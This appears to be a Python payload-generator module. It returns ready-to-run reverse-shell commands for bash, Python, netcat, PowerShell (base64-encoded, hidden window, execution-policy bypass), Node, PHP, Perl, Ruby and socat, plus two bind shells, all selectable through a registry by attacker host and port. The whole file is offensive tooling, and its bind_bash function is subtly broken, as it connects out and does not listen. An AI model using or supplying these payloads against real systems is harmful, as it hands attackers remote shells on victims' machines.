def reverse_bash(lhost: str, lport: int, pty: bool = False) -> str:
    if pty:
        return "script -qc bash /dev/null > /dev/tcp/" + lhost + "/" + str(lport) + " 0>&1"
    return "bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + str(lport) + " 0>&1'"


def reverse_bash_detached(lhost: str, lport: int) -> str:
    return "setsid /bin/bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + str(lport) + " 0>&1' &"


def reverse_python(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
    return (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"" + lhost + "\"," + str(lport) + "));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"" + shell + "\",\"-i\"])'"
    )


def reverse_nc(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
    return "nc -e " + shell + " " + lhost + " " + str(lport)


def reverse_powershell(lhost: str, lport: int) -> str:
    import base64
    ps = (
        "$client = New-Object System.Net.Sockets.TCPClient(\"" + lhost + "\"," + str(lport) + ");"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    )
    b64 = base64.b64encode(ps.encode("utf-16le")).decode()
    return "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + b64


def js_child_process_reverse(lhost: str, lport: int) -> str:
    return (
        "var cp=process.getBuiltinModule('child_process');"
        "var s=process.getBuiltinModule('net').Socket();"
        "s.connect(" + str(int(lport)) + ",'" + lhost + "');"
        "s.on('connect',function(){"
        "var c=cp.spawn('/bin/bash',['-i'],"
        "{stdio:[s,s,s],detached:true,env:process.env});"
        "c.unref();"
        "});"
        "return 1"
    )


def reverse_node_detached(lhost: str, lport: int) -> str:
    return js_child_process_reverse(lhost, lport)


def reverse_php(lhost: str, lport: int) -> str:
    return (
        "php -r '$s=fsockopen(\"" + lhost + "\"," + str(lport) + ");"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )


def reverse_perl(lhost: str, lport: int) -> str:
    return (
        "perl -e 'use Socket;"
        "$i=\"" + lhost + "\";"
        "$p=" + str(lport) + ";"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");};'"
    )


def reverse_ruby(lhost: str, lport: int) -> str:
    return (
        "ruby -rsocket -e '"
        "f=TCPSocket.open(\"" + lhost + "\"," + str(lport) + ");"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f.fileno(),f.fileno(),f.fileno())'"
    )


def reverse_socat(lhost: str, lport: int) -> str:
    return "socat tcp-connect:" + lhost + ":" + str(lport) + " exec:/bin/bash,pty,stderr"


def bind_bash(lport: int) -> str:
    return "bash -c 'bash -i >& /dev/tcp/0.0.0.0/" + str(lport) + " 0>&1'"


def bind_nc(lport: int, shell: str = "/bin/bash") -> str:
    return "nc -lvnp " + str(lport) + " -e " + shell


REGISTRY = {
    "bash": reverse_bash,
    "bash_pty": lambda h, p: reverse_bash(h, p, pty=True),
    "bash_detached": reverse_bash_detached,
    "python": reverse_python,
    "nc": reverse_nc,
    "powershell": reverse_powershell,
    "node": js_child_process_reverse,
    "php": reverse_php,
    "perl": reverse_perl,
    "ruby": reverse_ruby,
    "socat": reverse_socat,
}


def get(name: str, lhost: str, lport: int) -> str:
    fn = REGISTRY.get(name)
    if not fn:
        keys = ", ".join(sorted(REGISTRY))
        raise ValueError("unknown payload: " + name + " (have: " + keys + ")")
    return fn(lhost, lport)
